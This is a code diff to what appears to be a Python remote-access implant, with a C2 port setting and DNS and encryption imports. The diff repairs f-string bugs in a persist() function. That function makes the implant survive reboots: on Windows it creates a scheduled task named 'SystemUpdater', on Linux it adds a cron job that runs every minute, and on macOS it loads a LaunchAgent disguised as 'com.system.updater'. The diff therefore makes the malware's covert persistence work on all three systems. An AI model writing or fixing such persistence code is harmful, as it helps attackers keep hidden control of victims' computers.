@@ -11,6 +11,11 @@ from cryptography.fernet import Fernet
 from datetime import datetime
 import dnslib
 from socket import socket, AF_INET, SOCK_DGRAM
+import platform
+import subprocess
+import random
+import time
+import psutil
 
 # Configuration
 C2_PORT = 8443
@@ -287,28 +292,30 @@ def system_info():
 
 def persist():
     if platform.system() == "Windows":
-        subprocess.run(["schtasks", "/create", "/sc", "onlogon", "/tn", "SystemUpdater", "/tr", f"python {{os.path.abspath(__file__)}}", "/f"], capture_output=True)
+        subprocess.run(["schtasks", "/create", "/sc", "onlogon", "/tn", "SystemUpdater", "/tr", f"python {os.path.abspath(__file__)}", "/f"], capture_output=True)
     elif platform.system() == "Linux":
-        cron_job = f"* * * * * python3 {{os.path.abspath(__file__)}}"
+        cron_job = f"* * * * * python3 {os.path.abspath(__file__)}"
         with open("/tmp/cron", "w") as f:
             f.write(cron_job)
         subprocess.run(["crontab", "/tmp/cron"], capture_output=True)
     elif platform.system() == "Darwin":
-        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.system.updater</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>python3</string>
-        <string>{os.path.abspath(__file__)}</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-</dict>
-</plist>"""
+        plist = (
+            '<?xml version="1.0" encoding="UTF-8"?>\n'
+            '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
+            '<plist version="1.0">\n'
+            '<dict>\n'
+            '    <key>Label</key>\n'
+            '    <string>com.system.updater</string>\n'
+            '    <key>ProgramArguments</key>\n'
+            '    <array>\n'
+            '        <string>python3</string>\n'
+            f'        <string>{os.path.abspath(__file__)}</string>\n'
+            '    </array>\n'
+            '    <key>RunAtLoad</key>\n'
+            '    <true/>\n'
+            '</dict>\n'
+            '</plist>'
+        )
         with open(os.path.expanduser("~/Library/LaunchAgents/com.system.updater.plist"), "w") as f:
             f.write(plist)
         subprocess.run(["launchctl", "load", os.path.expanduser("~/Library/LaunchAgents/com.system.updater.plist")], capture_output=True)
